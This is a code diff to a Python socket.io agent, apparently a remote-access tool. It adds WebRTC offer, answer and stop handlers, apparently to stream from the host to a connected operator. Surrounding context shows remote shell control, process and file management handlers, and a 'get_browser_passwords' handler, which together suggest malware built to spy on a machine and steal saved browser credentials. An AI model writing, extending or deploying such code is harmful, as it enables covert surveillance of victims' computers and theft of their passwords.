@@ -10,6 +10,12 @@ import processes as proc
 import file_manager as fm
 import windows_control as wc
 
+try:
+    import webrtc_handler as _wrt
+    _WRT_OK = True
+except ImportError:
+    _WRT_OK = False
+
 def _res(rel):
     base = sys._MEIPASS if getattr(sys, "frozen", False) else os.path.dirname(os.path.abspath(__file__))
     return os.path.join(base, rel)
@@ -405,6 +411,35 @@ def on_shell_stop(_data=None):
         except Exception:
             pass
         _shell_proc = None
+
+
+@socketio.on("webrtc_request")
+def on_webrtc_request(_data=None):
+    if not _WRT_OK or not _wrt.available():
+        socketio.emit("webrtc_offer", {"error": "aiortc not installed"})
+        return
+    sid = request.sid
+    def _cb(sdp, type_):
+        if sdp:
+            socketio.emit("webrtc_offer", {"sdp": sdp, "type": type_, "_agent": _AGENT_NAME}, to=sid)
+        else:
+            socketio.emit("webrtc_offer", {"error": "offer failed"}, to=sid)
+    _wrt.create_offer(sid, _cb)
+
+@socketio.on("webrtc_answer")
+def on_webrtc_answer(data):
+    if _WRT_OK:
+        _wrt.set_answer(request.sid, data.get("sdp"), data.get("type", "answer"))
+
+@socketio.on("webrtc_stop")
+def on_webrtc_stop(_data=None):
+    if _WRT_OK:
+        _wrt.close(request.sid)
+
+@socketio.on("disconnect")
+def on_disconnect():
+    if _WRT_OK:
+        _wrt.close(request.sid)
 
 
 @socketio.on("get_browser_passwords")
